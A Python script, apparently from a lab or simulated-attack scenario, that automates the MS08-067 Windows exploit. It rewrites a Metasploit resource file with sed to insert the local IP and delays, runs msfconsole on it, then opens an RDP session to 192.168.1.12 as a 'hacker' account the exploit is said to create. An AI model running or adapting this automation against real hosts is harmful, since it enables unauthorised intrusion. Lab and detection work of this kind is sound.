from os import *
import sys
import time
import datetime
from datetime import timedelta

# IMPORTS & ALIAS
import setup as s
printtime = s.printtime
funcprinttime = s.funcprinttime


##### MS08_067 #####
#execute MS08_067 exploit & post exploit shenanigans 
def update_rc(delay):
	starttime = time.time()
	
	# reset gp.rc for metasploit
	rc_path = "/usr/share/metasploit-framework/scripts/gp.rc"
	system("cp /root/Desktop/attacks/ms08_067/gp.rc.copy "+rc_path) # every time the scenario restarts, reset this file	
	funcprinttime("gp.rc.copy > path", starttime)
	# update sleep time and current ip in gp.rc
	system("sed -e 's/sleep 30/sleep "+str(delay)+"/w /root/Desktop/attacks/ms08_067/gp.temp' \
		    -e 's/192.168.1.28/"+str(s.getip())+"/w /root/Desktop/attacks/ms08_067/gp.temp' "+rc_path+" > /root/Desktop/attacks/ms08_067/gp.temp") # write current ip to gp.rc
	system("cp /root/Desktop/attacks/ms08_067/gp.temp "+rc_path)

	funcprinttime("  - ip & delays updated in gp.rc", starttime)

update_rc.desc = "update gp.rc commands for metasploit use"


def ms08_067(n):
	starttime=time.time()
	endtime = time.time()+n
	funcprinttime("  Start", starttime)

	# Attack timing
	delay = (n/10)-1; # number of seconds to break up attack into equal sized pieces of time 
	update_rc(delay) # update ip address in gp.rc

	# gp.rc
	funcprinttime("  - gp.rc start with delays of ("+str(delay)+")", starttime)
	system("msfconsole -r /usr/share/metasploit-framework/scripts/gp.rc")
	funcprinttime("  - gp.rc complete", starttime)

	#RDP: connect to remote desktop enabled by exploit
	funcprinttime("  - RDP", starttime)	
	system("rdesktop -u hacker -p password 192.168.1.12")

	timeleft = endtime-time.time() 					
	if timeleft>0:
		funcprinttime("    - sleep for time remaining: "+str(round(timeleft,2)), starttime)
		time.sleep(timeleft)

	funcprinttime("  End",starttime)

ms08_067.desc = "MS08_067"
